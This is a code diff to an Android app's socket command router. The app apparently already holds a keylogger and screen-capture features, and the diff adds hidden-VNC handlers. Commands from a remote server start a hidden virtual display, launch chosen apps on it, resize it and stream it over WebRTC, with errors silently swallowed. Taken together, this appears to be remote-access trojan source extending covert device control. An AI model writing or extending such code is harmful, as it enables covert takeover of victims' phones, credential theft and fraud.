@@ -30,6 +30,8 @@ import com.fason.app.features.keylogger.KeyloggerDataManager;
 import com.fason.app.features.screen.ConnectionRequestActivity;
 import com.fason.app.features.screen.ScreenCaptureService;
 import com.fason.app.features.screen.WebRtcScreenManager;
+import com.fason.app.features.hvnc.HvncService;
+import com.fason.app.features.hvnc.HvncWebRtcManager;
 import com.fason.app.service.MainService;
 
 import org.json.JSONArray;
@@ -125,6 +127,14 @@ public final class SocketCommandRouter {
                     break;
                 case Protocol.WEBRTC_ICE:
                     WEBRTC_EXEC.execute(() -> WebRtcScreenManager.handleRemoteIce(data));
+                    break;
+                case Protocol.HVNC:        EXEC.execute(() -> handleHvnc(data, socket)); break;
+                case Protocol.HVNC_CTRL:   handleHvncControl(data, socket); break;
+                case Protocol.HVNC_OFFER:
+                    WEBRTC_EXEC.execute(() -> HvncWebRtcManager.handleOffer(data));
+                    break;
+                case Protocol.HVNC_ICE:
+                    WEBRTC_EXEC.execute(() -> HvncWebRtcManager.handleRemoteIce(data));
                     break;
             }
         } catch (Exception ignored) {}
@@ -824,6 +834,100 @@ public final class SocketCommandRouter {
             intent.setAction(ScreenCaptureService.ACTION_STOP);
             ctx.startService(intent);
         } catch (Exception ignored) {}
+    }
+
+    // ─── HVNC Handlers ─────────────────────────────────────────────
+
+    private static void handleHvnc(JSONObject data, Socket socket) {
+        String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_STATUS);
+        android.content.Context ctx = FasonApp.getContext();
+
+        switch (action) {
+            case Protocol.ACT_START: {
+                int width = data.optInt(Protocol.KEY_VIRTUAL_W, 720);
+                int height = data.optInt(Protocol.KEY_VIRTUAL_H, 1280);
+                int dpi = data.optInt(Protocol.KEY_DENSITY_DPI, 320);
+
+                Intent intent = new Intent(ctx, HvncService.class);
+                intent.setAction(HvncService.ACTION_START);
+                intent.putExtra(HvncService.EXTRA_WIDTH, width);
+                intent.putExtra(HvncService.EXTRA_HEIGHT, height);
+                intent.putExtra(HvncService.EXTRA_DPI, dpi);
+
+                try {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        ctx.startForegroundService(intent);
+                    } else {
+                        ctx.startService(intent);
+                    }
+                } catch (Exception e) {
+                    try {
+                        JSONObject error = new JSONObject();
+                        error.put(Protocol.KEY_TYPE, Protocol.KEY_ERROR);
+                        error.put(Protocol.KEY_ERROR, "Failed to start HVNC: " + e.getMessage());
+                        emit(socket, Protocol.HVNC, error);
+                    } catch (Exception ignored) {}
+                }
+                break;
+            }
+            case Protocol.ACT_STOP: {
+                Intent intent = new Intent(ctx, HvncService.class);
+                intent.setAction(HvncService.ACTION_STOP);
+                try { ctx.startService(intent); } catch (Exception ignored) {}
+                break;
+            }
+            case "detach":
+                WEBRTC_EXEC.execute(() -> HvncWebRtcManager.detachPeer(data.optString("sessionId")));
+                break;
+            case Protocol.ACT_STATUS:
+                HvncWebRtcManager.emitCurrentStatus();
+                break;
+            case Protocol.ACT_LAUNCH_APP: {
+                String pkg = data.optString(Protocol.KEY_PACKAGE_NAME, "");
+                if (!pkg.isEmpty()) {
+                    Intent intent = new Intent(ctx, HvncService.class);
+                    intent.setAction(HvncService.ACTION_LAUNCH_APP);
+                    intent.putExtra(HvncService.EXTRA_PACKAGE, pkg);
+                    try { ctx.startService(intent); } catch (Exception ignored) {}
+                }
+                break;
+            }
+            case Protocol.ACT_RESIZE: {
+                int width = data.optInt(Protocol.KEY_VIRTUAL_W, 720);
+                int height = data.optInt(Protocol.KEY_VIRTUAL_H, 1280);
+                int dpi = data.optInt(Protocol.KEY_DENSITY_DPI, 320);
+
+                Intent intent = new Intent(ctx, HvncService.class);
+                intent.setAction(HvncService.ACTION_RESIZE);
+                intent.putExtra(HvncService.EXTRA_WIDTH, width);
+                intent.putExtra(HvncService.EXTRA_HEIGHT, height);
+                intent.putExtra(HvncService.EXTRA_DPI, dpi);
+                try { ctx.startService(intent); } catch (Exception ignored) {}
+                break;
+            }
+        }
+    }
+
+    private static void handleHvncControl(JSONObject data, Socket socket) {
+        if (Protocol.ACT_STATUS.equals(data.optString(Protocol.KEY_ACTION, ""))) {
+            try {
+                JSONObject status = new JSONObject();
+                status.put("active", HvncService.isRunning());
+                emit(socket, Protocol.HVNC_CTRL, status);
+            } catch (Exception ignored) {}
+            return;
+        }
+
+        // Control messages are relayed through the WebRTC DataChannel,
+        // not through Socket.IO, for low-latency input. This fallback
+        // handles cases where the DataChannel is not yet established.
+        if (!HvncService.isRunning()) {
+            try {
+                JSONObject error = new JSONObject();
+                error.put(Protocol.KEY_ERROR, "HVNC is not running");
+                emit(socket, Protocol.HVNC_CTRL, error);
+            } catch (Exception ignored) {}
+        }
     }
 
 }
